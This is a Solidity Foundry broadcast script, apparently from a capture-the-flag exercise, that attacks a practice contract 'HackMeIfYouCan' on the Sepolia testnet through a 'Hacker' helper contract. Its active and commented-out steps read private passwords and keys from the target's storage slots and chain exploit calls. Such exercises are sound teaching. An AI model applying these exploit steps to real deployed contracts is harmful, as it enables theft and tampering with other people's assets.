// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

// forge script script/HackBroadcast.s.sol:HackScript --rpc-url $SEPOLIA_RPC_URL -vvvv --private-key $PRIVATE_KEY --legacy --broadcast

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";
import {Hacker} from "../src/Hacker.sol";

contract HackScript is Script {
        HackMeIfYouCan public toHack = HackMeIfYouCan(0x9D29D33d4329640e96cC259E141838EB3EB2f1d9);
        Hacker public hacker = Hacker(0xF2D7D554489284F81ac3f7aEb9010fF92030a3A2);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // address payable toHackAddress = payable(vm.envAddress("TO_HACK"));
        // address payable hackerAddress = payable(vm.envAddress("HACKER_ADDRESS"));
        // toHack = HackMeIfYouCan(toHackAddress);
        // hacker = Hacker(hackerAddress);

        console.log(hacker.flip()); // ✅

        // hacker.addPoint(); // ✅

        // hacker.transfer(); // ✅

        // uint startSlot = 3;
        // bytes32 password = vm.load(address(toHack),bytes32(startSlot));
        // hacker.sendPassword(password);

        // hacker.contribute(); // ✅

        // startSlot = 16; // 4 + 12
        // bytes32 key = vm.load(address(toHack),bytes32(startSlot));
        // hacker.sendKey(bytes16(key));

        // hacker.goTo(1); // ✅

        vm.stopBroadcast();
    }

    // function flip() public { // ✅
    //     hacker.flip();
    // }

    // function addPoint() public {
    //     hacker.addPoint();
    // }

    // function transfer() public { // ✅
    //     hacker.transfer();
    // }

    // function sendKey() public { // ✅
    //     uint startSlot = 16; // 4 + 12
    //     bytes32 key = vm.load(address(toHack),bytes32(startSlot));
    //     hacker.sendKey(bytes16(key));
    // }

    // function sendPassword() public { // ✅
    //     uint startSlot = 3;
    //     bytes32 password = vm.load(address(toHack),bytes32(startSlot));
    //     hacker.sendPassword(password);
    // }

    // function contribute() public { // ✅
    //     hacker.contribute();
    // }

    // function goTo() public { // ✅
    //     hacker.goTo(1);
    // }
}
